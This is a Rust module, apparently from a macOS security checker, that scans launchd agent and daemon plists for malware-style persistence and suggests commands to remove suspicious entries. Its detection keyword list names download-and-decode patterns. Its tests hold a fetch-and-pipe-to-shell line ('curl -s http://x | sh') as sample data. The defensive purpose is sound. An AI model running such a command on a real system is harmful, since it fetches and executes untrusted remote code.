//! Persistance sous macOS : ce qui se relance tout seul (LaunchAgents de l'utilisateur et du système,
//! LaunchDaemons). C'est le moyen favori des logiciels malveillants pour Mac (Adload, Shlayer, Atomic Stealer…).

use std::path::{Path, PathBuf};

use super::super::{Constat, alerte, ok};
use crate::risk::Niveau;
use crate::{tr, trf};

const CAT: &str = "Persistance";

/// Programme lancé par un .plist de launchd (Program, ou premier élément de ProgramArguments), et ses arguments.
/// Les .plist binaires sont convertis en XML par plutil.
fn programme(plist: &Path) -> Option<(String, String)> {
    let r = crate::commande::lancer(
        std::process::Command::new("plutil")
            .args(["-convert", "xml1", "-o", "-"])
            .arg(plist),
        10,
    )?;
    lire_programme(&r.sortie)
}

/// Lit Program / ProgramArguments dans un plist XML.
fn lire_programme(xml: &str) -> Option<(String, String)> {
    let chaine = |apres: &str| -> Option<String> {
        let debut = apres.find("<string>")? + "<string>".len();
        let fin = apres[debut..].find("</string>")? + debut;
        Some(apres[debut..fin].trim().to_string())
    };
    if let Some((_, apres)) = xml.split_once("<key>Program</key>") {
        return Some((chaine(apres)?, String::new()));
    }
    let (_, apres) = xml.split_once("<key>ProgramArguments</key>")?;
    let tableau = apres.split_once("</array>")?.0;
    let mut elements = tableau
        .split("<string>")
        .skip(1)
        .filter_map(|e| e.split_once("</string>").map(|(v, _)| v.trim().to_string()));
    let premier = elements.next()?;
    Some((premier, elements.collect::<Vec<_>>().join(" ")))
}

/// Ce qui rend un lancement suspect : dossier temporaire ou caché, script qui télécharge ou décode du code.
fn soupcon(programme: &str, arguments: &str) -> Option<&'static str> {
    let p = programme.to_lowercase();
    if [
        "/tmp/",
        "/private/tmp/",
        "/private/var/tmp/",
        "/users/shared/",
        "/downloads/",
    ]
    .iter()
    .any(|d| p.contains(d))
    {
        return Some(tr!(
            "lancé depuis un dossier temporaire ou partagé",
            "run from a temporary or shared folder"
        ));
    }
    if p.split('/')
        .any(|morceau| morceau.starts_with('.') && morceau.len() > 1)
    {
        return Some(tr!("lancé depuis un dossier caché", "run from a hidden folder"));
    }
    let interprete = [
        "/bash",
        "/sh",
        "/zsh",
        "/python",
        "/python3",
        "/osascript",
        "/perl",
        "/ruby",
    ]
    .iter()
    .any(|i| p.ends_with(i));
    let a = arguments.to_lowercase();
    if interprete
        && ["curl ", "base64", "| sh", "|sh", "eval ", "osascript -e"]
            .iter()
            .any(|m| a.contains(m))
    {
        return Some(tr!(
            "script qui télécharge ou décode du code au démarrage",
            "script that downloads or decodes code at startup"
        ));
    }
    None
}

pub fn persistance() -> Vec<Constat> {
    let maison = PathBuf::from(std::env::var_os("HOME").unwrap_or_default());
    let dossiers = [
        (maison.join("Library/LaunchAgents"), false),
        (PathBuf::from("/Library/LaunchAgents"), true),
        (PathBuf::from("/Library/LaunchDaemons"), true),
    ];
    let mut constats = Vec::new();
    let mut tiers = Vec::new();
    for (dossier, systeme) in dossiers {
        for f in std::fs::read_dir(&dossier).into_iter().flatten().flatten() {
            let chemin = f.path();
            if chemin.extension().is_none_or(|e| e != "plist") {
                continue;
            }
            // Le nom du fichier et le programme lancé sont choisis par qui a posé l'agent : montrés rendus
            // inoffensifs ; les commandes, elles, visent le vrai fichier.
            let nom = crate::ui::affichable(f.file_name().to_string_lossy().trim_end_matches(".plist"));
            // Les services d'Apple vivent dans /System : ceux-ci sont tous ajoutés par des programmes installés.
            let Some((prog, args)) = programme(&chemin) else {
                continue;
            };
            tiers.push(nom.clone());
            let Some(raison) = soupcon(&prog, &args) else { continue };
            let prog = crate::ui::affichable(&prog);
            let plist = crate::commande::sh_chaine(&chemin.display().to_string());
            let (arret, retrait) = if systeme {
                (
                    format!("sudo launchctl bootout system {plist}"),
                    format!("sudo mv {plist} ~/.Trash/"),
                )
            } else {
                (
                    format!("launchctl bootout gui/$(id -u) {plist}"),
                    format!("mv {plist} ~/.Trash/"),
                )
            };
            constats.push(
                alerte(
                    CAT,
                    Niveau::Eleve,
                    trf!(
                        "« {nom} » se relance à chaque démarrage, {raison} : {prog}. C'est la marque habituelle des logiciels malveillants pour Mac.",
                        "“{nom}” restarts at every boot, {raison}: {prog}. This is the usual mark of Mac malware."
                    ),
                )
                .corriger(
                    trf!(
                        "Arrêter « {nom} » et mettre son fichier à la corbeille (récupérable)",
                        "Stop “{nom}” and move its file to the Trash (recoverable)"
                    ),
                    &[format!("{arret} 2>/dev/null; true"), retrait],
                ),
            );
        }
    }
    if constats.is_empty() {
        constats.push(if tiers.is_empty() {
            ok(
                CAT,
                tr!(
                    "Aucun programme tiers ne se relance au démarrage.",
                    "No third-party program restarts at boot."
                ),
            )
        } else {
            ok(
                CAT,
                trf!(
                    "{} programme(s) tiers se relancent au démarrage, rien de suspect : {}.",
                    "{} third-party program(s) restart at boot, nothing suspicious: {}.",
                    tiers.len(),
                    tiers.join(", ")
                ),
            )
        });
    }
    constats
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn lecture_des_plist() {
        let simple = "<dict><key>Label</key><string>com.ex.a</string><key>Program</key><string>/Applications/A.app/Contents/MacOS/a</string></dict>";
        assert_eq!(
            lire_programme(simple),
            Some(("/Applications/A.app/Contents/MacOS/a".into(), String::new()))
        );
        let args = "<key>ProgramArguments</key>\n<array>\n\t<string>/bin/bash</string>\n\t<string>-c</string>\n\t<string>curl -s http://x | sh</string>\n</array>";
        assert_eq!(
            lire_programme(args),
            Some(("/bin/bash".into(), "-c curl -s http://x | sh".into()))
        );
    }

    #[test]
    fn programmes_suspects() {
        assert!(soupcon("/Users/a/Library/Application Support/.hidden/agent", "").is_some());
        assert!(soupcon("/private/tmp/x", "").is_some());
        assert!(soupcon("/bin/bash", "-c curl -s http://x | sh").is_some());
        assert!(soupcon("/Applications/Zoom.app/Contents/MacOS/zoom", "").is_none());
        assert!(soupcon("/Library/Application Support/Google/GoogleUpdater/launcher", "--wake").is_none());
    }
}
